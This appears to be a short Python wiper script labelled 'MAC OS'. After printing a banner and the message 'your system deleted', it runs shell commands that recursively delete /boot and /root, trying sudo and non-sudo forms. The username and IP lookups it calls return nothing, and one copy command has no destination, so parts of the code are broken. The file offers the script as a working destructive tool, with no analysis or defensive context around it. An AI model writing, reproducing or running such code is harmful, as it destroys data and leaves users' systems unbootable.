import time, banner, os, socket, getpass
from requests import get
from color import Color

def ClearCSR():
    os.system('clear')
    os.system('cls')

def username():
    getpass.getuser()

def ip_local():
    get('https://api.ipify.org').text

def ip_public():
    socket.gethostbyname(socket.gethostname())

def MacOS():
    while True:
        try:
            ClearCSR()
            banner.Created_banner(Color.RED + 'MAC OS')
            time.sleep(2)
            username()
            ip_local()
            print('[*] -> your system deleted')
            os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
            os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
            os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
            os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
            break
        except AttributeError:
            print( Color.RED +'[*] -> plese check the systems.')